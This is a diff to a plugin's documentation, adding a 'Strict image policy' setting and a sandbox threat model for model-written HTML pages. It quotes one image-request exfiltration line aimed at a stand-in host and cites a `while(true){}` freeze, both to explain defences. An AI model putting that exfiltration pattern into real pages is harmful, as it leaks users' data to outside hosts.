@@ -11,7 +11,8 @@ Chinese remodel plan: `docs/REDESIGN-SANDBOX-FIRST.zh-CN.md`.
 |---------|---------|---------|
 | Theme | `iui-default` | Neutral sandbox theme tokens / DS kit (legacy pack ids resolve here) |
 | Fence repair feedback | on | Same-turn repair hint when a fence fails to render |
-| Format referee | on | Visual / must-fence asks → steer toward ```iui-html |
+| Format referee | on | Only when the user explicitly asks for a page (build/show verb + visual artifact) and the reply has none → steer toward ```iui-html |
+| Strict image policy | off | Sandbox `img-src` / `font-src` drop the `https:` wildcard: only `data:` / `blob:`, Wikimedia, map tiles and the plugin's own library route. Blocks `new Image().src = "https://x/?d=" + data` exfiltration; arbitrary web images stop loading. Planned default **on** in 0.14 |
 | Custom tokens JSON | — | Optional token overrides for sandbox CSS vars |
 | User templates JSON | — | HTML/CSS/JS starters the user saved |
 | Enable Jev router | **off** | TypeSafe System One format pick; **off without key** |
@@ -32,6 +33,28 @@ Endpoints (no secrets):
 
 Host / FreeLLMAPI may expose `IUI_FENCE_*` style hints; they do **not** become sampling constraints. Prefer plugin Settings toggles above.
 
+
+## Sandbox threat model (what page scripts can see)
+
+Pages are written by the model and run in an iframe with `sandbox="allow-scripts"` only — no `allow-same-origin`, `allow-modals`, `allow-popups`, `allow-forms` or top navigation. The frame has an opaque origin.
+
+A page script **can**:
+- read its own html/css/js and anything the user types into it;
+- receive host bindings / appData of the **current session**, and only if its source uses them (`data-iui-bind`, `$bind`, `iui-bindings` / `iui-appdata` events, `appData` / `bindings`);
+- load images over any `https:` URL (unless **Strict image policy** is on) — this is a data-exfiltration channel for whatever the page can read;
+- navigate its own frame to another URL (CSP cannot prevent frame self-navigation).
+
+A page script **cannot**:
+- read the host DOM, cookies, localStorage, other chats or other frames;
+- read another session's bindings (`bindings.json` / `bindings.sse` require `?session=`, reject cross-site requests and have no "latest session" fallback);
+- `fetch` arbitrary hosts (CSP `connect-src` is limited to library CDNs and map/geocode services);
+- open system dialogs (`alert` / `confirm` / `prompt` become an in-page toast; `confirm` returns `false`, `prompt` returns `null`);
+- send a model turn or fill the composer without a real user click, and then at most 1 per frame per 2 s and 6 per tab per minute;
+- open a popup (links go through the host, https/mailto only).
+
+A page that stops responding for 5 s (e.g. `while(true){}`) gets a「页面无响应」overlay with **Stop** (replaces the document, ending its scripts) and **Reload**. Whether the host stays responsive during such a loop depends on the browser putting the opaque sandbox frame in its own process (Chromium site isolation for sandboxed frames); on browsers that do not, the loop can still freeze the tab until Stop takes effect.
+
+Map embeds (`map` node `embed`) are limited to exact provider hosts (OpenStreetMap `export/embed.html`, Google `maps/embed`, Bing `maps/embed`, maps.google.com, uri.amap.com, map.baidu.com); other URLs are shown as a plain link. ```json / no-language code blocks are never auto-rendered: a block that is strictly a page object gets a「▶ 渲染为页面」button instead.
 
 ## Sandbox bridge security note
 
